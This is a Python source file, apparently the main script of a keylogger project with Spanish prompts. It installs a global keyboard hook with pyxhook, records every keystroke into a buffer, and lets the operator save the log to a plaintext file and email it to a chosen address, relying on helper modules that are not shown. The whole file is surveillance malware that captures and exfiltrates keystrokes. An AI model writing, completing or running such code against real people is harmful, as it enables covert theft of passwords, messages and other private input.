## ari
import time
import pyxhook
import sys
import termios
from keylogger_core import Keyloggerore
from file_manager import guardar_en_archivo
from email_handler import enviar_email

def mostrar_menu():
    print("============= Configuración del keylogger =============")
    print("Responde 'yes'/'y' para SÍ, 'no'/'n' para NO, o 'exit' para salir.")
    print()

    while True:
        print("¿Deseas enviar los registros por correo?")
        correo = input("Respuesta: ").strip().lower()
        if correo == 'exit': sys.exit(0)
        elif correo in ['yes', 'y']: enviar = True; break
        elif correo in ['no', 'n']: enviar = False; break
        else: print("Entrada inválida.")

    while True:
        print("¿Deseas guardar los registros en texto plano?")
        guardar = input("Respuesta: ").strip().lower()
        if guardar == 'exit': sys.exit(0)
        elif guardar in ['yes', 'y']: archivo = True; break
        elif guardar in ['no', 'n']: archivo = False; break
        else: print("Entrada inválida.")

    return enviar, archivo

def main():
    enviar, guardar = mostrar_menu()
    logger = Keyloggerore(enviar_correo=enviar, guardar_local=guardar)
    hookman = pyxhook.HookManager()
    hookman.KeyDown = logger.callback
    hookman.HookKeyboard()
    hookman.start()

    try:
        while logger.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[x] Interrupción manual.")
    finally:
        hookman.cancel()

        if guardar:
            archivo = guardar_en_archivo(logger.buffer)
        else:
            archivo = None

        if enviar and archivo:
            print("Ingresa el correo destinatario:")
            destinatario = input("Correo: ").strip()
            enviar_email(destinatario, archivo)

        print("============= Keylogger finalizado. =============")

if __name__ == "__main__":
    main()
